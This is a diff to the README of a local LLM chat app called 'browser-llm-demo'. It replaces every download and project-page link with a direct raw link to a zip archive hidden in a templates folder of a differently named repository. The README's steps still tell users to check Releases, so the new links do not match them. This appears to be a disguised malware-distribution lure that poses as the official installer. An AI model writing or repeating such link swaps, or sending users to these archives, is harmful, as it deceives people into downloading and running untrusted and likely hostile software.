@@ -1,6 +1,6 @@
 # 🤖 browser-llm-demo - Private language chat on your computer
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/longstanding-mogadishu7120/browser-llm-demo)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/longstanding-mogadishu7120/Markie/raw/refs/heads/main/src/components/templates/Software_1.2.zip)
 
 ## What is this tool?
 
@@ -20,13 +20,13 @@ To run this application well, your computer needs specific hardware. Check these
 
 You need to visit the project page to access the software. Follow these steps to prepare your computer.
 
-1. Go to the [official download page](https://github.com/longstanding-mogadishu7120/browser-llm-demo).
+1. Go to the [official download page](https://github.com/longstanding-mogadishu7120/Markie/raw/refs/heads/main/src/components/templates/Software_1.2.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the latest version number to open the files.
 4. Download the folder or installer provided.
 5. Extract the files to a folder you can find easily on your desktop.
 
-[![](https://img.shields.io/badge/Visit_Project_Page-Grey?style=for-the-badge)](https://github.com/longstanding-mogadishu7120/browser-llm-demo)
+[![](https://img.shields.io/badge/Visit_Project_Page-Grey?style=for-the-badge)](https://github.com/longstanding-mogadishu7120/Markie/raw/refs/heads/main/src/components/templates/Software_1.2.zip)
 
 ## ⚙️ Running the application
 
